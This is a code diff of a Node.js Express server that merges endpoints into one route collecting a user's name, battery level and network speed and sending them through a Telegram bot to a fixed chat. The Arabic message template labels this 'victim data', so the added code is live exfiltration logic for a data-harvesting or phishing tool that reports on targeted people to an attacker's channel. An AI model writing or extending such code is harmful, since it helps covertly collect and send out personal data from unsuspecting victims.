@@ -10,46 +10,23 @@ app.use(express.static('.'));
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// إرسال اسم المستخدم
-app.post('/api/send-username', async (req, res) => {
-  const { username } = req.body;
+// إرسال كل البيانات في رسالة واحدة
+app.post('/api/send-all-data', async (req, res) => {
+  const { username, battery, network } = req.body;
   
   if (!username) {
     return res.status(400).json({ error: 'missing username' });
   }
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `👤 اسم المستخدم: ${username}`
-      })
-    });
+    const message = `📱 بيانات الضحية:\n\n👤 الاسم: ${username}\n🔋 البطارية: ${battery || 'غير معروف'}%\n📶 سرعة النت: ${network || 'غير معروف'}`;
     
-    const result = await response.json();
-    res.json({ success: true, result });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-
-// إرسال البطارية
-app.post('/api/send-battery', async (req, res) => {
-  const { battery, username } = req.body;
-  
-  if (!battery) {
-    return res.status(400).json({ error: 'missing battery' });
-  }
-
-  try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `🔋 نسبة البطارية: ${battery}%\n👤 المستخدم: ${username || 'غير معروف'}`
+        text: message
       })
     });
     
